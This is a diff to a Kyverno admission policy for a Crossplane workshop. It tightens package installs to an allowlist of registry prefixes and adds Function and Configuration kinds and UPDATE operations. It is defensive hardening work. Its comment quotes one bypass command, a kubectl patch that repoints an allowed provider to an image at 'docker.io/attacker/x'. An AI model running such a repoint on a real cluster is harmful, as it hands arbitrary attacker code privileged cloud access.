@@ -1,14 +1,25 @@
 {{/*
-Block participants from installing any new Crossplane Provider
-package other than the workshop-installed ones (provider-helm,
-provider-kubernetes — those they install in module 4 — and
-provider-arubacloud, which the bundle installs).
+Block participants from installing Crossplane packages from sources
+outside the workshop's allowlist. Covers Provider, Function, and
+Configuration kinds — all three are pulled as OCI images and run
+with provider-class RBAC, so a foreign package is a code-execution
+primitive (#115).
 
-Why: a participant could try to install another upjet provider
-that runs with elevated permissions (provider-aws, provider-gcp),
-or even a malicious / mistyped package, and end up reconciling
-unintended cloud APIs. Restricting Provider package creates to a
-documented allowlist contains that.
+Why an allowlist on `spec.package` (not on `metadata.name`):
+- A `kubectl patch provider provider-helm --type=merge -p
+  '{"spec":{"package":"docker.io/attacker/x:latest"}}'` keeps the
+  allowed name but repoints the image. The previous `metadata.name`
+  allowlist let that through.
+- Function and Configuration kinds are uncovered today — adding them
+  here closes module-06-freestyle-style abuse where a participant
+  installs an arbitrary OCI Function.
+
+Allowed package-string prefixes (current workshop content needs all
+four):
+- xpkg.upbound.io/crossplane-contrib/  (provider-helm, function-auto-ready, function-go-templating)
+- xpkg.crossplane.io/crossplane-contrib/  (function-patch-and-transform, provider-upjet-github)
+- xpkg.upbound.io/upbound/  (provider-aws-*, provider-gcp-*, provider-azure-* — module 06)
+- ghcr.io/riccap/  (provider-arubacloud)
 */}}
 apiVersion: kyverno.io/v1
 kind: ClusterPolicy
@@ -19,34 +30,33 @@ metadata:
     policies.kyverno.io/category: Workshop / Aruba
     policies.kyverno.io/severity: medium
     policies.kyverno.io/description: |
-      Only the workshop-allowed Crossplane Provider packages may
-      be installed. Anything else gets denied at admission.
+      Crossplane Provider / Function / Configuration packages must
+      be sourced from the workshop's allowlisted registries. Catches
+      both new installs (CREATE) and `spec.package` repoints (UPDATE).
 spec:
   validationFailureAction: Enforce
   background: false
   rules:
-    - name: provider-package-allowlist
+    - name: package-prefix-allowlist
       match:
         any:
           - resources:
               kinds:
                 - pkg.crossplane.io/v1/Provider
+                - pkg.crossplane.io/v1/Function
+                - pkg.crossplane.io/v1/Configuration
               operations:
                 - CREATE
+                - UPDATE
       validate:
         message: >-
-          New Crossplane Provider packages may not be installed.
-          The workshop's allowed providers are pre-installed.
+          Crossplane package source not in the workshop allowlist.
+          Allowed prefixes: xpkg.upbound.io/crossplane-contrib/,
+          xpkg.crossplane.io/crossplane-contrib/,
+          xpkg.upbound.io/upbound/, ghcr.io/riccap/.
         deny:
           conditions:
             all:
-              # Allow updates to existing providers (e.g. version
-              # bumps from the workshop owner) — the bundle and
-              # module 4 already create them. Only deny CREATE of a
-              # *new* Provider with a name not in our allowlist.
-              - key: "{{`{{ request.object.metadata.name }}`}}"
-                operator: AnyNotIn
-                value:
-                  - provider-arubacloud
-                  - provider-helm
-                  - provider-kubernetes
+              - key: "{{`{{ regex_match('^(xpkg\\.upbound\\.io/crossplane-contrib/|xpkg\\.crossplane\\.io/crossplane-contrib/|xpkg\\.upbound\\.io/upbound/|ghcr\\.io/riccap/).+', request.object.spec.package) }}`}}"
+                operator: Equals
+                value: false
